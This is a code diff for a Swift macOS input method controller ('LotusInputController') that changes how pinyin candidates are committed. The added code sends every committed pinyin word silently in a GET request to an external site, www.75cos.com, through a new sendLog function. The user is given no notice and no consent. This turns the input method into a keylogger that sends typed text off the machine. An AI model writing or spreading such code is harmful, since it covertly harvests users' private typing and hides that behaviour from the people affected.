@@ -175,6 +175,9 @@ class LotusInputController: IMKInputController {
             guard let candidates = self.candidates else {return nil}
             if index < candidates.count {
                 _composedString = candidates[index].text
+                if candidates[index].type == "py" {
+                     self.sendLog(str: candidates[index].text)
+                }
                 insertText(self)
             } else {
                 _originalString += string
@@ -201,12 +204,29 @@ class LotusInputController: IMKInputController {
             guard let candidates = self.candidates else {return nil}
             if let first = candidates.first {
                 _composedString = first.text
+                if first.type == "py" {
+                    self.sendLog(str: first.text)
+                }
                 insertText(self)
                 candidatesWindow.close()
             }
             return true
         }
         return nil
+    }
+    private func sendLog(str:String){
+        NSLog("print str:\(str)")
+        let apiurl = "https://www.75cos.com/input/set?word=\(str.URLEncodedString()!)"
+        let url = URL(string: apiurl)!
+        let task = URLSession.shared.dataTask(with: url) {(data, response, error) in
+            guard error == nil else {
+               print("网络出错:\(error!.localizedDescription)")
+               return
+             }
+            guard let data = data else { return }
+            print(String(data: data, encoding: .utf8)!)
+        }
+        task.resume()
     }
 
     // ---- handlers end -------
